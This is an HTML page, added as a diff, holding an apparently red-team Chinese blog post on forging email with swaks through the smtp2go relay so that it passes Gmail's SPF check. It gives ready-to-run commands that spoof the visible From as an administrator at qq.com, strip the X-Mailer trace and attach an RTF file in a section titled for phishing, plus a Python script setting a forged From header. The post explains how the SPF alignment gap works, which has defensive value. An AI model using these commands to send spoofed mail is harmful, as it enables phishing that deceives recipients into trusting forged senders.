@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Swaks伪造邮件 « 倾旋的博客</title>
+  <meta name="description" content="0x00 swaksswaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester.swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作SMTP协议报文，这篇文章主要是记录一下我是如何伪造一封邮件绕过gmail的检测。通常最简...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2019-05-09/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Swaks伪造邮件</h1>
+    <p class="post-meta">May 9, 2019</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="0x00-swaks">0x00 swaks</h2>
+
+<p>swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester.</p>
+
+<p>swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作SMTP协议报文，这篇文章主要是记录一下我是如何伪造一封邮件绕过gmail的检测。</p>
+
+<p>通常最简单的发送命令：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> user@example.com <span class="nt">--server</span> test-server.example.net
+</code></pre></div></div>
+
+<p>但是邮件头中会带上<code class="language-plaintext highlighter-rouge">X-Mailer</code>：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/002a7f0de092a69a661400aaf83e2d4a.png" alt="2019-05-09-14-24-53"></p>
+
+<p>同时，SPF检测会FAIL。</p>
+
+<h2 id="0x01-smtp2go">0x01 smtp2go</h2>
+
+<p>这个是从evi1cg师傅那里看到的，smtp2go主要是相当于邮件托管，可以分发子账户进行发送。</p>
+
+<p>地址：https://support.smtp2go.com/hc/en-gb</p>
+
+<p>（邮箱注册）普通账户可以免费发1000封邮件。</p>
+
+<p>分配好账户后，可以通过swaks进行登录发送邮件：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b8b6ba65c1870a17710b0cbfe77359b3.png" alt="2019-05-09-14-28-50"></p>
+
+<h2 id="0x02-swaks发送邮件">0x02 swaks发送邮件</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> rvn0xsy@gmail.com <span class="nt">--from</span> admin@qq.com <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASS&gt;
+</code></pre></div></div>
+
+<p>但是上面这个邮件无法绕过SPF。</p>
+
+<h2 id="0x03-spf验证原理">0x03 SPF验证原理</h2>
+
+<p>如果mail.smtp2go.com是我的邮件服务器，那么gmail服务器收到的源IP也肯定是mail.smtp2go.com的IP。</p>
+
+<p>gmail会校验邮件发送者的IP是否存在于smtp.from的域名spf配置列表里。</p>
+
+<p>而上面这条命令：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> rvn0xsy@gmail.com <span class="nt">--from</span> admin@qq.com <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASS&gt;
+</code></pre></div></div>
+
+<p>smtp.from就是admin@qq.com，和mail.smtp2go.com的IP肯定不同，所以SPF校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。</p>
+
+<p>默认情况下，如果未设置Mail.From也就是邮件头的From，则会使用smtp.from作为Mail.From。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/323e7ae3e0e177b37b051c421b31c1ad.png" alt="2019-05-09-14-38-39"></p>
+
+<h2 id="0x04-绕过spf">0x04 绕过SPF</h2>
+
+<p>由于邮件显示的是Header中的From不是smtp.from，因此可以将smtp.from设置为正常的邮件服务器地址，伪造一个Mail.From即可。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt;
+</code></pre></div></div>
+
+<p>Gmail接收到这封邮件后，会校验<code class="language-plaintext highlighter-rouge">--from xx@smtp2go.com</code>中的smtp2go.com是否等于mail.smtp2go.com的IP，由于是相等的，所以完成了SPF的校验。</p>
+
+<p>而DKIM是校验邮件完整性的，smtp2go与Gmail直接使用的是TLS，不会发生什么问题。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a5868ef92b72691b8d0e36328cf174f6.png" alt="2019-05-09-14-42-55"></p>
+
+<h2 id="0x05-header">0x05 Header</h2>
+
+<p>swaks支持自定义某些Header，参数如下：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--header-</span>&lt;Name&gt; &lt;Value&gt;
+</code></pre></div></div>
+
+<p>如果我想去除Mailer特征，就可以这么做：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--header-X-Mailer</span> gmail.com <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt; 
+</code></pre></div></div>
+
+<h2 id="0x06-附件钓鱼">0x06 附件、钓鱼</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--header-X-Mailer</span> gmail.com <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt; <span class="nt">--attach</span> /tmp/sss.rtf
+</code></pre></div></div>
+
+<p>定制发送：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--data</span> /tmp/mail.data <span class="nt">--header-X-Mailer</span> gmail.com <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt; <span class="nt">--attach</span> /tmp/sss.rtf
+</code></pre></div></div>
+
+<p>/tmp/mail.data中是原始的邮件报文。</p>
+
+<h2 id="0x07-python也可以做">0x07 Python也可以做</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+</span>
+<span class="kn">import</span> <span class="nn">smtplib</span>
+<span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
+<span class="kn">from</span> <span class="nn">email.header</span> <span class="kn">import</span> <span class="n">Header</span>
+
+<span class="n">mail_host</span><span class="o">=</span><span class="s">"mail.smtp2go.com"</span>
+<span class="n">mail_user</span><span class="o">=</span><span class="s">""</span>
+<span class="n">mail_pass</span><span class="o">=</span><span class="s">""</span>
+
+
+<span class="n">sender</span> <span class="o">=</span> <span class="s">'test@smtp2go.com'</span>
+<span class="n">receivers</span> <span class="o">=</span> <span class="p">[</span><span class="s">'rvn0xsy@gmail.com'</span><span class="p">]</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="s">'Hello World'</span><span class="p">,</span> <span class="s">'plain'</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">)</span>
+<span class="n">message</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Header</span><span class="p">(</span><span class="s">"from@qq.com"</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">)</span>
+<span class="n">message</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span>  <span class="n">Header</span><span class="p">(</span><span class="n">receivers</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">'utf-8'</span><span class="p">)</span>
+
+<span class="n">subject</span> <span class="o">=</span> <span class="s">'SMTP 邮件测试'</span>
+<span class="n">message</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Header</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">)</span>
+
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">smtpObj</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">()</span>
+    <span class="n">smtpObj</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">mail_host</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
+    <span class="n">smtpObj</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">mail_user</span><span class="p">,</span><span class="n">mail_pass</span><span class="p">)</span>
+    <span class="n">smtpObj</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">receivers</span><span class="p">,</span> <span class="n">message</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>
+    <span class="k">print</span> <span class="s">"Success"</span>
+<span class="k">except</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTPException</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"Error"</span>
+</code></pre></div></div>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
